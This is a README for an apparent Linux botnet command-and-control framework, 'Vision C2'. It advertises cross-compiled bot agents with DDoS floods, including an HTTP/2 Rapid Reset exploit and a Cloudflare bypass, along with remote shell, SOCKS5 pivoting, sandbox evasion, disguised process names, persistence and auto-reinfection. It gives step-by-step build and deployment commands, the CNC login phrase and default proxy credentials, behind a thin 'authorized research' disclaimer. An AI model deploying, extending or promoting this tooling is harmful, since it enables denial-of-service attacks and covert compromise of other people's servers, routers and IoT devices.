
<div align="center">

# ☾℣☽ision C2 - Multi-Arch Linux Botnet Framework

> **14-arch cross-compiled agents DDOS, RCE, and SOCKS5 modules. Communcations protected by TLS 1.3 transport + 6-Layer C2 Address Obfuscation + AES-128-CTR string encryption, Anti-Anaylsis/Sandbox Killer and full persistence — driven through a real-time Go TUI**

![Go](https://img.shields.io/badge/Go-1.24.0+-00ADD8?style=for-the-badge&logo=go)
![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)

[![Architecture](https://img.shields.io/badge/Full_Architecture-Documentation-blueviolet?style=for-the-badge)](Docs/ARCHITECTURE.md)
[![Changelog](https://img.shields.io/badge/Full_ChangeLog-Documentation-blueviolet?style=for-the-badge)](Docs/CHANGELOG.md)
<img width="907" height="840" alt="image" src="https://github.com/user-attachments/assets/5013c6de-7ac0-4ef8-9aaa-3900c7558b16" />

</div>

---

## Key Features

| | Feature | Details |
|---|---|---|
| 🔧 | **Auto-Setup** | Python script automates config + build |
| 🌐 | **Cross-Platform** | 14 multi-arch targets, custom UPX packer (strips headers) |
| 🔒 | **Comms** | TLS 1.3 on port 443, indistinguishable from standard HTTPS |
| 🧦 | **SOCKS5 Proxy** | Full pivoting, RFC 1929 auth, runtime credential updates |
| 💻 | **Remote Shell** | Command execution + output capture, Linux shortcuts & post-exploit helpers |
| 🛡️ | **Evasion** | 6-layer C2 encryption (AES-128-CTR + obfuscation), encrypted strings, split XOR key, 40+ VM/sandbox/debugger signatures, 24–27h delayed exit |
| 👻 | **Stealth** | Unix daemonization, single-instance, disguised process names, PID lock |
| 🔁 | **Persistence** | Systemd + cron + rc.local, hidden dir w/ download script, auto-reinfection, cleanup tool included |

---

## Attack Methods

<img width="1183" height="869" alt="image" src="https://github.com/user-attachments/assets/9b08df61-6280-40b2-9baf-a9840ca1887c" />

<details open>
<summary><b>Layer 4 — Network/Transport</b></summary>

| Method | Description |
|---|---|
| **UDP Flood** | High-volume 1024-byte payload spam |
| **TCP Flood** | Connection table exhaustion |
| **SYN Flood** | SYN packets with randomized source ports (raw TCP) |
| **ACK Flood** | ACK packet flooding (raw TCP) |
| **GRE Flood** | GRE protocol (47) packets with max payload |
| **DNS Flood** | Randomized DNS query types (DNS Reflection Attack, Max PPS+) |

</details>

<details open>
<summary><b>Layer 7 — Application</b></summary>

| Method | Description |
|---|---|
| **HTTP Flood** | GET/POST with randomized headers + user-agents |
| **HTTPS/TLS Flood** | TLS handshake exhaustion + burst requests |
| **CF Bypass** | Cloudflare bypass via session/cookie reuse + fingerprinting |
| **Rapid Reset** | HTTP/2 exploit (CVE-2023-44487) with batched HEADERS + RST_STREAM |
| **Proxy Support** | Full proxy integration for all L7 methods (HTTP + SOCKS5) |

</details>


---

<img width="1179" height="586" alt="image" src="https://github.com/user-attachments/assets/06f7ca4c-3119-4cd3-81dd-2224d131c290" />

## Installation


## 📋 Prerequisites

```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3 screen netcat

# Go 1.23+
wget https://go.dev/dl/go1.23.0.linux-amd64.tar.gz
sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf go1.23.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
```

| Requirement | Minimum | Recommended |
|---|---|---|
| RAM / Storage | 512MB / 1GB | 2GB+ / 5GB+ |
| OS | Linux (any) | Ubuntu 22.04+ / Debian 12+ |
| Network | Port 443 open | + Admin port for split mode |

---

## 🚀 Setup

```bash
git clone https://github.com/Syn2Much/VisionC2.git && cd VisionC2
python3 setup.py   # Select [1] Full Setup
```

The wizard prompts for **C2 address**, **admin port** (default: 420), and **TLS cert details**. Output:

```
bins/              → 14 bot binaries (multi-arch)
cnc/certificates/  → server.crt + server.key
server             → CNC binary
setup_config.txt   → Config summary
```

To change C2 address later: `python3 setup.py` → option **[2]**. Redeploy bots afterward.

---

## 🖥️ Starting the CNC

```bash
./server              # TUI mode (default, recommended)
./server --split      # Telnet mode on admin port (default: 420)
```

**Split mode connect:** `nc YOUR_IP 420` → type `spamtec` → login.

**Background:** `screen -S vision ./server` (detach: `Ctrl+A, D`)

**First run** creates root user with random password — save it.

---

## 🎨 TUI Navigation

| Key | Action |
|---|---|
| `↑/↓` or `k/j` | Navigate |
| `Enter` | Select |
| `q` / `Esc` | Back / Cancel |
| `r` | Refresh |

### Dashboard Views

- **🤖 Bot List** — Live bot status. `Enter`=shell, `b`=broadcast shell, `l`=attack, `i`=info, `p`=persist, `r`=reinstall, `k`=kill
- **💻 Remote Shell** — Interactive shell to one bot. `Ctrl+F`=clear, `Ctrl+P`=persist, `Ctrl+R`=reinstall
- **📡 Broadcast Shell** — Command all bots. `Ctrl+A`=filter arch, `Ctrl+G`=filter RAM, `Ctrl+B`=limit bots
- **⚡ Launch Attack** — Select method, target, port, duration → `l` to launch
- **📊 Ongoing Attacks** — Progress bars + time remaining. `s`=stop all
- **🧦 Socks Manager** — `s`=start socks, `x`=stop. Default: `socks5://visionc2:synackrst666@BOT_IP:1080`. Update creds: `!socksauth <user> <pass>`
- **📜 Connection Logs** — Bot connect/disconnect history

---


### Bot Binaries

| Binary | Architecture | Use Case |
|--------|--------------|----------|
| ethd0 | x86_64 (amd64) | Servers, desktops |
| kworkerd0 | x86 (386) | 32-bit systems |
| ip6addrd | ARM64 | Raspberry Pi 4, phones |
| mdsync1 | ARMv7 | Raspberry Pi 2/3 |
| deferwqd | MIPS | Routers |
| devfreqd0 | MIPSLE | Routers (little-endian) |
| *...and 8 more* | Various | IoT, embedded |

 > [`Build.sh`](tools/build.sh) | Full binary map reference 
---


## Architecture

### Two Main Components

- **`cnc/`** — Command & Control server. Dual-listener architecture: TLS on port 443 for bot connections, Interactive TUI built with Bubble Tea. RBAC with four permission levels (Basic/Pro/Admin/Owner) defined in `users.json`.

- **`bot/`** — Agent deployed to targets. Connects back to CNC over TLS 1.3. Lifecycle: decrypt config → daemonize → singleton lock → sandbox detection → install persistence → DNS-resolve C2 → connect with reconnect loop.

### Key Source Files

| File | Purpose |
|------|---------|
| `bot/config.go` | All configuration: AES-encrypted C2 address (`encGothTits`), crypto seed, magic code, protocol version, encrypted string blobs |
| `bot/connection.go` | TLS connection, multi-method DNS resolution chain (DoH → UDP → A record → raw) |
| `bot/attacks.go` | All L4/L7 DDoS methods |
| `bot/opsec.go` | AES encryption, key derivation, sandbox/VM/debugger detection |
| `bot/persist.go` | Persistence via systemd, cron, rc.local |
| `bot/socks.go` | SOCKS5 proxy with RFC 1929 auth |
| `cnc/ui.go` | Bubble Tea TUI — all views, keybindings, rendering |
| `cnc/cmd.go` | Command dispatch and routing to bots |
| `cnc/connection.go` | Bot connection handling, TLS setup, heartbeat |
| `cnc/miscellaneous.go` | RBAC, user authentication, utilities |

---

## Encryption Architecture

- **C2 address**: 6-layer encoding pipeline — AES-128-CTR outer layer wrapping 5 inner layers (MD5 checksum → byte substitution → RC4 → XOR rotating key → base64). The AES-encrypted blob is decrypted at runtime then decoded in a 5 step decryption process)
- **Sensitive strings**: AES-128-CTR with key derived from 16 split XOR functions. Encrypted at build time via `tools/crypto.go`, decrypted at runtime by `initSensitiveStrings()` 
- **Transport**: TLS 1.3 with self-signed certificates (generated by `setup.py` in `cnc/certificates/`)

## Documentation

| Document | Description |
|---|---|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | Full system architecture |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | Version history and changes |
| [`COMMANDS.md`](Docs/COMMANDS.md) | Command reference |
| [`SETUP.md`](Docs/SETUP.md) | Setup guide|

---

## Legal Disclaimer

> **FOR AUTHORIZED SECURITY RESEARCH AND EDUCATIONAL PURPOSES ONLY**
>
> **Usage of this tool for attacking targets without prior mutual consent is illegal. The developer assumes no liability and is not responsible for any misuse or damage caused by this program.**

---

## Author

**Syn2Much** — [dev@sinnners.city](mailto:dev@sinnners.city) · [@synacket](https://x.com/synacket)

---

<div align="center">
<sub>Maintained with ❤️ by Syn</sub>
</div>
